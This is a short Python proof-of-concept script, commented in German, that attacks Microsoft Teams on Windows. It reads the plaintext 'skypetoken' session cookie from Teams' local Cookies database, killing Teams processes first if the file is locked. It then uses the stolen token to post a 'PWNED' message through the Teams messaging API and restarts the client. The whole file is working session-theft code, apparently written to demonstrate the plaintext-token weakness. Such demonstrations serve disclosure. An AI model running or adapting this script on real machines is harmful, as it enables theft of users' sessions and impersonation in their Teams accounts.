import requests
import sqlite3
import os
from time import sleep
from psutil import process_iter


payload = {
    "content": "<h1>PWNED:</h1><p>Diese Nachricht wurde mit Hilfe vom abgegriffenen Klartext-Token abgesendet</p>",
    "messagetype": "RichText/Html",
    "contenttype": "text",
    "amsreferences": [],
    "clientmessageid": "",
    "imdisplayname": "",
    "properties": {
        "importance": "high",
        "subject": "PWNED"
    }
}

url = "https://emea.ng.msg.teams.microsoft.com/v1/users/ME/conversations/48:notes/messages"
#url = "https://emea.ng.msg.teams.microsoft.com/v1/users/ME/conversations/19:<irgend-ein-hash>@unq.gbl.spaces/messages"

def main():
    print("...")
    db = sqlite3.connect(os.path.join(os.getenv('APPDATA'), "Microsoft/Teams/Cookies"))
    try:
        token = db.execute(
            'SELECT value from cookies WHERE name like "%skypetoken%"'
        ).fetchone()
        print("token erfolgreich abgegriffen")
    except:
        for proc in process_iter():
            if 'teams' in str(proc.name).lower():
                proc.kill()
        sleep(3)
        token = db.execute(
            'SELECT value from cookies WHERE name like "%skypetoken%"'
        ).fetchone()
        print("token erfolgreich abgegriffen")
    r = requests.post(url, json=payload, headers={"authentication": "skypetoken="+token[0]})
    if r.status_code == 201:
        print(f"nachricht gesendet: {r.content}")
    else:
        print(f"error: {r.status_code}")
    os.startfile(os.path.join("C:/Users", os.getenv("USERNAME"), "AppData/Local/Microsoft/Teams/current/Teams.exe"))


if __name__ == '__main__':
    main()
